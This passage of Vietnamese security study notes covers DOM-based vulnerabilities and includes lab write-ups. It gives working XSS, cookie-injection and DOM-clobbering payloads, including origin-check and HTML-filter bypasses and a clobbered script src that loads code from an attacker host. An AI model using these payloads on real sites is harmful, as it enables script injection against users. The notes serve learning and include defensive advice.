- `XMLHttpRequest.open()`
- `XMLHttpRequest.send()`
- `jQuery.globalEval()`
- `$.globalEval()`

# **DOM-based local file-path manipulation**

Lỗ hổng **thao tác đường dẫn tập tin cục bộ (local file-path manipulation)** phát sinh khi một script truyền dữ liệu có thể bị kẻ tấn công kiểm soát vào một API xử lý tập tin dưới dạng tham số tên tập tin. Kẻ tấn công có thể lợi dụng lỗ hổng này để tạo một URL sao cho, nếu người dùng khác truy cập, trình duyệt của họ sẽ mở một tập tin cục bộ tùy ý.

Tác động tiềm ẩn phụ thuộc vào cách website sử dụng tập tin được mở:

- Nếu website **đọc dữ liệu** từ tập tin, kẻ tấn công có thể thu thập được dữ liệu đó.
- Nếu website **ghi một số dữ liệu cụ thể** vào một tập tin nhạy cảm, kẻ tấn công có thể ghi dữ liệu của họ vào tập tin đó — ví dụ như tập tin cấu hình của hệ điều hành.

Trong cả hai trường hợp, khả năng khai thác thực tế của lỗ hổng còn có thể phụ thuộc vào việc trang web có cung cấp các chức năng phù hợp khác hay không.

Sink kém bảo mật

- `FileReader.readAsArrayBuffer()`
- `FileReader.readAsBinaryString()`
- `FileReader.readAsDataURL()`
- `FileReader.readAsText()`
- `FileReader.readAsFile()`
- `FileReader.root.getFile()`

# **DOM-based client-side SQL injection**

Lỗ hổng **SQL-injection phía client** dựa trên DOM phát sinh khi một script chèn dữ liệu có thể bị kẻ tấn công điều khiển vào một truy vấn SQL phía client một cách không an toàn. Kẻ tấn công có thể lợi dụng lỗ hổng này để tạo một URL sao cho, nếu người dùng khác truy cập, truy vấn SQL tùy ý do kẻ tấn công cung cấp sẽ được thực thi trong cơ sở dữ liệu SQL cục bộ của trình duyệt người dùng.

Tác động tiềm ẩn phụ thuộc vào cách website sử dụng cơ sở dữ liệu SQL phía client. Nếu cơ sở dữ liệu được dùng để lưu trữ dữ liệu nhạy cảm, chẳng hạn tin nhắn trên một mạng xã hội, kẻ tấn công có thể truy xuất được những dữ liệu này.

Nếu cơ sở dữ liệu được dùng để lưu các hành động người dùng chờ xử lý, chẳng hạn các tin nhắn sắp gửi trong một ứng dụng email, thì kẻ tấn công có thể sửa đổi dữ liệu này và thực hiện các hành động tùy ý thay mặt người dùng.

Sink kém bảo mật
- `executeSql()`

# **DOM-based HTML5-storage manipulation**

Lỗ hổng **thao tác HTML5-storage** dựa trên DOM phát sinh khi một script lưu dữ liệu có thể bị kẻ tấn công điều khiển vào bộ lưu trữ HTML5 của trình duyệt web (hoặc `localStorage` hoặc `sessionStorage`). Kẻ tấn công có thể tận dụng hành vi này để tạo một URL sao cho, nếu người dùng khác truy cập, trình duyệt của họ sẽ lưu trữ dữ liệu do kẻ tấn công kiểm soát.

Hành vi này tự nó không phải là một lỗ hổng bảo mật. Tuy nhiên, nếu ứng dụng sau đó đọc lại dữ liệu từ bộ lưu trữ và xử lý nó một cách không an toàn, kẻ tấn công có thể lợi dụng cơ chế lưu trữ để triển khai các tấn công dựa trên DOM khác, chẳng hạn như cross-site scripting (XSS) và chèn JavaScript.

Sink kém bảo mật
- `sessionStorage.setItem()`
- `localStorage.setItem()`

# **DOM-based client-side XPath injection**

Lỗ hổng **chèn XPath dựa trên DOM** phát sinh khi một script chèn dữ liệu có thể bị kẻ tấn công điều khiển vào một truy vấn XPath. Kẻ tấn công có thể lợi dụng hành vi này để tạo một URL sao cho, nếu một người dùng khác của ứng dụng truy cập, sẽ kích hoạt thực thi một truy vấn XPath tùy ý, điều này có thể khiến website truy xuất và xử lý các dữ liệu khác nhau.


Tùy vào mục đích sử dụng kết quả truy vấn, kẻ tấn công có thể làm sai lệch logic của website hoặc gây ra các hành động ngoài ý muốn thay mặt người dùng.


Sink kém bảo mật
- `document.evaluate()`
- `element.evaluate()`
# **DOM-based client-side JSON injection**

Lỗ hổng **chèn JSON dựa trên DOM** phát sinh khi một script chèn dữ liệu có thể bị kẻ tấn công điều khiển vào một chuỗi mà chuỗi đó sau đó được phân tích (parsed) như một cấu trúc dữ liệu JSON và được ứng dụng xử lý. Kẻ tấn công có thể lợi dụng hành vi này để tạo một URL sao cho, nếu người dùng khác truy cập, sẽ khiến dữ liệu JSON tùy ý được xử lý.

Tùy vào mục đích sử dụng dữ liệu này, kẻ tấn công có thể làm sai lệch logic của website hoặc gây ra các hành động ngoài ý muốn thay mặt người dùng khác.


Sink kém bảo mật
- `JSON.parse()`
- `jQuery.parseJSON()`
- `$.parseJSON()`

# **DOM-data manipulation**
Lỗ hổng **thao túng dữ liệu DOM** phát sinh khi một script ghi dữ liệu có thể bị kẻ tấn công điều khiển vào một trường (field) trong DOM mà trường này được sử dụng trong giao diện người dùng hiển thị (visible UI) hoặc trong logic phía client. Kẻ tấn công có thể lợi dụng lỗ hổng này để tạo một URL sao cho, nếu người dùng khác truy cập, sẽ làm thay đổi giao diện hoặc hành vi của UI phía client. Lỗ hổng thao tác dữ liệu DOM có thể bị khai thác cả dưới dạng reflected và stored DOM-based attacks.

Ở mức nhẹ hơn, kẻ tấn công có thể lợi dụng lỗ hổng này để thực hiện _defacement_ ảo của website, chẳng hạn thay đổi văn bản hoặc hình ảnh được hiển thị trên một trang cụ thể. Tuy nhiên, các cuộc tấn công có thể nghiêm trọng hơn. Ví dụ, nếu kẻ tấn công có thể thay đổi thuộc tính `src` của một phần tử, họ có thể khiến người dùng thực hiện các hành động ngoài ý muốn bằng cách nhập một file JavaScript độc hại.


 Sink kém bảo mật
- `script.src`
- `script.text`
- `script.textContent`
- `script.innerText`
- `element.setAttribute()`
- `element.search`
- `element.text`
- `element.textContent`
- `element.innerText`
- `element.outerText`
- `element.value`
- `element.name`
- `element.target`
- `element.method`
- `element.type`
- `element.backgroundImage`
- `element.cssText`
- `element.codebase`
- `document.title`
- `document.implementation.createHTMLDocument()`
- `history.pushState()`
- `history.replaceState()`
# **DOM-based denial of service**

Lỗ hổng **từ chối dịch vụ (denial-of-service)** dựa trên DOM phát sinh khi một script truyền dữ liệu có thể bị kẻ tấn công điều khiển vào một API nền tảng có vấn đề một cách không an toàn — ví dụ một API mà việc gọi nó có thể khiến máy tính của người dùng tiêu thụ một lượng lớn CPU hoặc dung lượng đĩa. Điều này có thể gây ra các tác dụng phụ nếu trình duyệt giới hạn chức năng của website, ví dụ bằng cách từ chối các nỗ lực lưu trữ dữ liệu vào `localStorage` hoặc chấm dứt các script đang chiếm nhiều tài nguyên.

Sink kém bảo mật
- `requestFileSystem()`
- `RegExp()`

# **DOM-based web message**


Trong phần này, chúng ta sẽ xem xét cách thức thông điệp web có thể được sử dụng làm **source** để khai thác các lỗ hổng dựa trên DOM trên trang nhận. Chúng tôi cũng sẽ mô tả cách xây dựng một cuộc tấn công như vậy, bao gồm cách các kỹ thuật xác minh nguồn gốc (origin-verification) phổ biến thường có thể bị vượt qua.

Nếu một trang xử lý các thông điệp web nhận được theo cách không an toàn — ví dụ, không xác minh chính xác `origin` của thông điệp trong hàm lắng nghe sự kiện (event listener) — thì các thuộc tính và hàm được gọi bởi event listener đó có thể trở thành các **sink**. Ví dụ, kẻ tấn công có thể host một `iframe` độc hại và sử dụng `postMessage()` để truyền dữ liệu thông điệp web tới event listener dễ tổn thương, sau đó listener này gửi payload tới một sink trên trang cha. Hành vi này có nghĩa là bạn có thể sử dụng thông điệp web làm nguồn để truyền dữ liệu độc hại tới bất kỳ sink nào kể trên.

Tác động tiềm ẩn của lỗ hổng phụ thuộc vào cách tài liệu đích xử lý thông điệp nhận được. Nếu tài liệu đích tin tưởng người gửi sẽ không truyền dữ liệu độc hại trong thông điệp và xử lý dữ liệu đó một cách không an toàn bằng cách truyền nó vào một sink, thì hành vi kết hợp của hai tài liệu có thể cho phép kẻ tấn công xâm phạm người dùng.

**Xây dựng cuộc tấn công**

Xem đoạn mã sau:

```html
<script>
window.addEventListener('message', function(e) {
  eval(e.data);
});
</script>
```

Đoạn mã này dễ bị tổn thương vì kẻ tấn công có thể chèn một payload JavaScript bằng cách dựng `iframe` như sau:

```html
<iframe src="//vulnerable-website" onload="this.contentWindow.postMessage('print()','*')">
```

Vì bộ lắng nghe sự kiện không xác minh **origin** của thông điệp, và phương thức `postMessage()` được gọi với `targetOrigin` là `"*"`, bộ lắng nghe sẽ chấp nhận payload và truyền nó vào một **sink** — trong ví dụ này là hàm `eval()`.

**Origin verification**
Ngay cả khi một bộ lắng nghe sự kiện (event listener) có bao gồm một hình thức xác minh nguồn gốc nào đó, bước xác minh này đôi khi vẫn có thể sai về mặt logic cơ bản. Ví dụ, xem đoạn mã sau:

```jsx
window.addEventListener('message', function(e) {
    if (e.origin.indexOf('normal-website.com') > -1) {
        eval(e.data);
    }
});
```

Phương thức `indexOf` được dùng để cố gắng xác minh rằng origin của thông điệp đến thuộc domain `normal-website.com`. Tuy nhiên, trên thực tế nó chỉ kiểm tra xem chuỗi `"normal-website.com"` có xuất hiện ở bất kỳ chỗ nào trong URL origin hay không. Do đó, kẻ tấn công có thể dễ dàng vượt qua bước xác minh này nếu origin của thông điệp độc hại của họ là, ví dụ, `http://www.normal-website.com.evil.net`.

Sai sót tương tự cũng áp dụng cho các kiểm tra xác minh dựa trên `startsWith()` hoặc `endsWith()`. Ví dụ, bộ lắng nghe sau đây sẽ coi origin `http://www.malicious-websitenormal-website.com` là an toàn:

```jsx
window.addEventListener('message', function(e) {
    if (e.origin.endsWith('normal-website.com')) {
        eval(e.data);
    }
});
```

Miễn là một website chấp nhận dữ liệu thông điệp web từ một nguồn không đáng tin cậy do thiếu xác minh nguồn gốc thích đáng, bất kỳ **sink** nào được bộ lắng nghe sự kiện `message` sử dụng đều có khả năng dẫn tới lỗ hổng.

# **DOM clobbering**

Trong phần này, chúng tôi sẽ mô tả DOM clobbering là gì, minh họa cách bạn có thể khai thác các lỗ hổng DOM bằng kỹ thuật clobbering, và đề xuất các cách giảm mức phơi nhiễm trước các cuộc tấn công DOM clobbering.


DOM clobbering là một kỹ thuật trong đó bạn chèn HTML vào một trang để thao tác DOM và cuối cùng thay đổi hành vi của JavaScript trên trang. DOM clobbering đặc biệt hữu ích trong những trường hợp mà XSS không khả thi, nhưng bạn có thể kiểm soát một phần HTML trên trang mà các thuộc tính `id` hoặc `name` được bộ lọc HTML cho vào whitelist. Hình thức DOM clobbering phổ biến nhất sử dụng phần tử `anchor` để ghi đè một biến toàn cục, biến này sau đó được ứng dụng sử dụng một cách không an toàn, ví dụ như sinh URL script động.

Thuật ngữ _clobbering_ xuất phát từ thực tế rằng bạn đang “ghi đè” một biến toàn cục hoặc thuộc tính của một đối tượng và thay thế nó bằng một node DOM hoặc một bộ sưu tập HTML (DOM collection). Ví dụ, bạn có thể dùng các đối tượng DOM để ghi đè các đối tượng JavaScript khác và khai thác các tên không an toàn, như `submit`, để gây can thiệp vào hàm `submit()` thực sự của form.


Một mẫu phổ biến được các nhà phát triển JavaScript sử dụng là:

```jsx
var someObject = window.someObject || {};
```

Nếu bạn có thể kiểm soát một phần HTML trên trang, bạn có thể clobber tham chiếu `someObject` bằng một node DOM, chẳng hạn một anchor. Xem đoạn mã sau:

```html
<script>
    window.onload = function() {
        let someObject = window.someObject || {};
        let script = document.createElement('script');
        script.src = someObject.url;
        document.body.appendChild(script);
    };
</script>
```

Để khai thác đoạn mã dễ bị tổn thương này, bạn có thể chèn HTML sau để clobber tham chiếu `someObject` bằng một phần tử anchor:

```html
<a id=someObject><a id=someObject name=url href=//malicious-website.com/evil.js>
```

Vì hai thẻ anchor sử dụng cùng một `id`, DOM sẽ nhóm chúng lại thành một DOM collection (HTMLCollection). Vector DOM clobbering sau đó sẽ ghi đè tham chiếu `someObject` bằng DOM collection này. Thuộc tính `name` được dùng trên anchor cuối cùng nhằm ghi đè thuộc tính `url` của đối tượng `someObject`, khiến `script.src` trỏ tới một script bên ngoài do kẻ tấn công kiểm soát.


Một kỹ thuật phổ biến khác là sử dụng phần tử `form` cùng với một phần tử như `input` để **clobber** các thuộc tính của DOM. Ví dụ, ghi đè thuộc tính `attributes` cho phép bạn vượt qua các bộ lọc phía client sử dụng thuộc tính này trong logic của chúng. Mặc dù bộ lọc sẽ duyệt thuộc tính `attributes`, nhưng nó sẽ không thực sự xóa bất kỳ thuộc tính nào vì `attributes` đã bị ghi đè bằng một node DOM. Kết quả là bạn sẽ có thể chèn các thuộc tính độc hại mà thông thường sẽ bị lọc đi. Ví dụ, hãy xem đoạn chèn sau:

```html
<form onclick=alert(1)><input id=attributes>Click me
```

Trong trường hợp này, bộ lọc phía client sẽ duyệt DOM và gặp một phần tử `form` được whitelist. Thông thường, bộ lọc sẽ lặp qua thuộc tính `attributes` của phần tử `form` và loại bỏ bất kỳ thuộc tính nào nằm trong blacklist. Tuy nhiên, vì thuộc tính `attributes` đã bị clobber thành phần tử `input`, bộ lọc sẽ lặp qua phần tử `input` thay vào đó. Do phần tử `input` có độ dài (`length`) là `undefined`, các điều kiện cho vòng lặp `for` của bộ lọc (ví dụ `i < element.attributes.length`) không được thỏa, và bộ lọc đơn giản chuyển sang phần tử tiếp theo. Kết quả là sự kiện `onclick` bị bộ lọc bỏ qua hoàn toàn, và hàm `alert()` sau đó được phép gọi trong trình duyệt.

# Bảo mật


Nói một cách đơn giản nhất, bạn có thể ngăn chặn các cuộc tấn công DOM-clobbering bằng cách triển khai các kiểm tra để đảm bảo rằng các đối tượng hoặc hàm là những gì bạn mong đợi. Ví dụ, bạn có thể kiểm tra rằng thuộc tính `attributes` của một node DOM thực sự là một thể hiện của `NamedNodeMap`. Điều này đảm bảo rằng thuộc tính đó là thuộc tính `attributes` chứ không phải một phần tử HTML đã bị clobber.

Bạn cũng nên tránh viết mã tham chiếu tới một biến toàn cục kết hợp với toán tử logic `||`, vì điều này có thể dẫn tới lỗ hổng DOM clobbering.

Tóm lại:

- Kiểm tra rằng các đối tượng và hàm là hợp lệ. Nếu bạn đang lọc DOM, hãy đảm bảo kiểm tra rằng đối tượng hoặc hàm không phải là một node DOM.
- Tránh các mẫu mã xấu. Nên tránh sử dụng biến toàn cục kết hợp với toán tử logic `||`.
- Sử dụng thư viện đã được kiểm thử kỹ, chẳng hạn `DOMPurify`, mà xem xét các lỗ hổng DOM-clobbering.


# WU
- [x] DOM XSS using web messages
- [x] DOM XSS using web messages and a JavaScript URL
- [x] DOM XSS using web messages and JSON.parse
- [x] DOM-based open redirection
- [x] DOM-based cookie manipulation
- [x] Exploiting DOM clobbering to enable XSS
- [x] Clobbering DOM attributes to bypass HTML filters

## DOM-based open redirection
- khi vào xem source ở phần comment của 1 blog ta thấy 1 đoạn script
![](../../image/Pasted%20image%2020260504022935.png)

script này lấy bất kỳ URL nào sau tham số `url=` mà không kiểm tra xem nó có thuộc domain của Lab hay không

ta có thể chèn link của explit server vào url:
`https://YOUR-LAB-ID.web-security-academy.net/post?postId=4&url=https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/`

## DOM-based cookie manipulation
- truy cập trang web, khi ấn vào 1 product, thấy có chức năng last view product, ở mã nguồn thấy có đoạn mã js xử lý việc lưu lại sản phẩm cuối cùng mà người dùng đã xem
![](../../image/Pasted%20image%2020260504024159.png)

- Script lấy toàn bộ chuỗi nằm sau tham số `lastViewedProduct=` trong URL.
- Nó trực tiếp nối chuỗi này vào lệnh gán `document.cookie`.
- Vì không có bước lọc dữ liệu (sanitization), chúng ta có thể sử dụng các ký tự điều khiển Cookie như dấu chấm phẩy (`;`) để chèn thêm các thuộc tính khác vào Cookie.
- Mục tiêu là chèn một Cookie mới hoặc thay đổi thuộc tính của Cookie hiện tại

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/product?productId=1&lastViewedProduct=abc%3B+SameSite=None%3B+Secure" onload="if(!window.x)this.src='https://YOUR-LAB-ID.web-security-academy.net/';" style="display:none"></iframe>`

Khi iframe tải trang sản phẩm với tham số `lastViewedProduct`, script lỗi trên trang Lab sẽ thực thi và ghi Cookie. Đoạn `%3B+SameSite=None%3B+Secure` giúp đảm bảo Cookie được ghi đúng định dạng trong một số trình duyệt hiện đại.

![](../../image/Pasted%20image%2020260504024508.png)
- deliver to victim đế solved bài lab

## DOM-based XSS web message

- ở sourec của web có 1 đoạn mã js xử lí
![](../../image/Pasted%20image%2020260504025326.png)
- `window.addEventListener('message', ...)`: Trang web đang sẵn sàng nhận tin nhắn từ bất kỳ cửa sổ nào khác.
- Script không kiểm tra `e.origin`. Điều này có nghĩa là bất kỳ trang web nào (bao gồm cả trang độc hại của kẻ tấn công) đều có thể gửi tin nhắn đến trang này.
- **Sink nguy hiểm:** `e.data` được đưa trực tiếp vào `.innerHTML`. Điều này cho phép chèn các thẻ HTML và script thực thi.

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">`

- `src`: Địa chỉ trang Lab mục tiêu.
- `onload`: Đợi iframe tải xong thì mới bắt đầu gửi tin nhắn.
- `postMessage('<img src=1 onerror=alert(1)>','*')`: Gửi một đoạn mã HTML chứa sự kiện `onerror` để kích hoạt XSS. Dấu `'*'` có nghĩa là gửi đến bất kỳ origin nào (mặc dù thực tế nó sẽ gửi vào iframe vừa load).

- vào trang exploit và deliver đến victim để solved bài lab này


## DOM XSS using web messages and a JavaScript URL

- ở home page có 1 đoạn js xử lí việc điều hướng:
![](../../image/Pasted%20image%2020260504030246.png)

- `window.addEventListener('message', ...)`: Trang web nhận tin nhắn từ bất kỳ cửa sổ nào (thiếu kiểm tra `e.origin`).
- Biến `url` (tức `e.data`) chỉ cần chứa chuỗi `http:` hoặc `https:` là sẽ được gán vào `location.href`.
- **Lỗi Logic:** Lập trình viên chỉ kiểm tra xem chuỗi có _chứa_ giao thức hợp lệ hay không, chứ không kiểm tra xem chuỗi đó có _bắt đầu_ bằng giao thức đó không. Điều này cho phép chúng ta dùng giao thức `javascript:` và đẩy `http:` vào phần comment


=> ta cần gửi một tin nhắn chứa đoạn mã JavaScript để thực thi `alert()`. Để bypass bộ lọc `indexOf`, chúng ta sẽ thêm chuỗi `https:` vào sau dấu comment của JavaScrip

`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/" onload="this.contentWindow.postMessage('javascript:print()//http:','*')">`
Trong đó: 
- `javascript:alert(1)`: Mã độc cần thực thi.
- `//https:`: Phần này là một comment trong JavaScript (`//`). Nó giúp payload thỏa mãn điều kiện `indexOf('https:') > -1` của bài lab mà không làm hỏng cú pháp lệnh thực thi.
- `location.href` sẽ nhận giá trị: `javascript:alert(1)//https:`. Trình duyệt sẽ thực thi lệnh `alert(1)` ngay lập tức.

## DOM XSS using web messages and `JSON.parse`

- khi nhìn sourrce của page home, có 1 đoạn mã js:
![](../../image/Pasted%20image%2020260504030736.png)
- **JSON.parse(e.data)**: Ứng dụng mong đợi nhận được một chuỗi định dạng JSON (ví dụ: `{"type":"load-channel", "url":"..."}`).
- **Lỗi logic**: Không có kiểm tra `e.origin`.
- **Sink nguy hiểm**: Nếu chúng ta gửi `type: 'load-channel'`, dữ liệu `url` sẽ được đưa vào `iframe.src`. Điều này cho phép sử dụng giao thức `javascript:`.

=> ta cần gửi một tin nhắn là một chuỗi JSON hợp lệ để "lừa" hàm `JSON.parse` và đi vào nhánh `load-channel`
`<iframe src=https://YOUR-LAB-ID.web-security-academy.net/ onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}","*")'>`

- Chúng ta gửi một chuỗi: `{"type":"load-channel", "url":"javascript:print()"}`. Lưu ý việc escape dấu nháy kép `\"` để chuỗi JSON hợp lệ bên trong hàm `postMessage`.
- Khi trang Lab nhận được, `JSON.parse` sẽ tạo ra một object. Biến `data.url` lúc này mang giá trị `javascript:print()`.
- Lệnh `iframe.src = "javascript:print()"` sẽ thực thi hàm in (hoặc bạn có thể dùng `alert(1)`) ngay lập tức trong ngữ cảnh của trang Lab

## Exploiting DOM clobbering to enable XSS

- khi vào xem source ở page home, sẽ thấy 1 file .js xử lí comment:
![](../../image/Pasted%20image%2020260504031321.png)

![](../../image/Pasted%20image%2020260504031345.png)

- Biến `defaultAvatar` cố gắng lấy từ `window.defaultAvatar`. Nếu không tồn tại, nó mới dùng giá trị mặc định.
- **Lỗ hổng:** Nếu chúng ta chèn được một phần tử HTML có `id="defaultAvatar"`, trình duyệt sẽ gán phần tử đó vào `window.defaultAvatar`.
- Tuy nhiên, code truy cập vào thuộc tính `.url` (`defaultAvatar.url`). Một thẻ HTML đơn lẻ không có thuộc tính này. Do đó, ta cần kỹ thuật **Clobbering lồng nhau**.


payload: `<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`

- **`cid:`**: Đây là một giao thức hợp lệ (thường dùng trong email/multipart). Nó được dùng ở đây để tạo ra một chuỗi bắt đầu mà không làm trình duyệt nghi ngờ ngay lập tức.
- **`&quot;` (Dấu nháy kép)**: Khi script lấy giá trị của `defaultAvatar.avatar` để đưa vào chuỗi HTML: `avatarImgHTML = '<img src="' + defaultAvatar.avatar + '">...';` Dấu nháy kép này sẽ **đóng sớm** thuộc tính `src` của thẻ `<img>`.
- **`onerror=alert(1)`**: Sau khi đóng `src`, đoạn này sẽ trở thành một thuộc tính mới của thẻ `<img>`.
- **`//`**: Dấu gạch chéo này dùng để biến phần dấu nháy kép còn thừa phía sau của code gốc trở thành một đoạn chú thích vô hại 

gửi payload này vào 1 comment của bài post, sau đó comment thêm 1 lần nữa.
khi load lại trang, alert sẽ hiển thị
![](../../image/Pasted%20image%2020260504032141.png)

Trình duyệt sẽ tạo ra một đoạn HTML:
```
<img src="cid:" onerror="alert(1)//">
```
Vì `src="cid:"` không phải là một đường dẫn ảnh hợp lệ, sự kiện **`onerror`** sẽ bị kích hoạt ngay lập tức, và hàm `alert(1)` sẽ thực thi.


## Clobbering DOM attributes to bypass HTML filters
- tìm file js xử lí việc comment: trong hàm displaycomment:
![](../../image/Pasted%20image%2020260504032941.png)
Bộ lọc này rất lỏng lẻo vì nó nằm trong **Whitelist** cho phép thẻ `<form>` có thuộc tính `id` và thẻ `<input>` có thuộc tính `id` (thông qua cơ chế mặc định của Janitor nếu không chặn). Đây chính là tiền đề để thực hiện **DOM Clobbering**.

- Dữ liệu sau khi qua `janitor.clean()` được đưa vào `innerHTML`
![](../../image/Pasted%20image%2020260504033033.png)

**Cơ chế**: Khi nối chuỗi `innerHTML`, trình duyệt sẽ phải thực hiện quá trình **Serialization** (chuyển đổi cấu trúc DOM hiện tại thành chuỗi HTML). Nếu chúng ta "clobber" được thuộc tính `attributes` của phần tử, quá trình này sẽ bị lỗi và để lộ ra các thuộc tính độc hại mà Janitor vốn dĩ sẽ lọc mất.

tạo 1 comment: `<form id=x tabindex=0 onfocus=print()><input id=attributes>` và ggửi
- `<form id=x>`: Tạo phần tử mục tiêu với ID là `x`.
- `tabindex=0`: Ép phần tử này có thể nhận tiêu điểm (focus).
- `onfocus=print()`: Đây là mã độc sẽ thực thi.
- `<input id=attributes>`:  Thẻ này sẽ ghi đè thuộc tính `.attributes` của thẻ `<form>` cha. Khi Janitor hoặc trình duyệt truy cập `form.attributes`, nó sẽ trả về thẻ input này thay vì danh sách các thuộc tính thực tế, khiến bộ lọc bị "mù" và bỏ qua việc kiểm tra `onfocus`.

Vì lỗi này cần sự kiện `onfocus`, chúng ta cần ép trình duyệt của nạn nhân tự động tập trung vào thẻ `form` vừa chèn.

`<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">`

- `iframe` tải trang bài viết chứa comment độc hại.
- Sau 500ms (để đảm bảo comment đã load xong), script sẽ thêm `#x` vào URL.
- Trình duyệt thấy URL Fragment `#x` sẽ tự động cuộn và **focus** vào phần tử có `id="x"`.
- Sự kiện `onfocus` kích hoạt và hàm `print()` được gọi.
